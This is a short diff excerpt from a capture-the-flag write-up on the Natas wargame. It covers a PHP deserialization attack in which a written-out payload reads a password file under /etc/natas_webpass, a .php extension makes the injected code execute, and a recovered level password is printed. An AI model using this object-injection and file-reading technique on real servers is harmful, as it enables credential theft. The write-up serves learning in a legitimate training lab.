@@ -1286,6 +1286,11 @@ print base64_encode(serialize($new))."\n";
 	<?php echo get_file_contents('/etc/natas_webpass/natas27'); ?>
 + To execute the script and get the result we need to output to `.php` file instead of `.txt` file. Changing the `.txt` extension to `.php` will execute the script and give us the password for next level.
 password: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+
+# References:
+https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a
+https://www.php.net/manual/en/function.file-get-contents.php
+
 	
 
 	
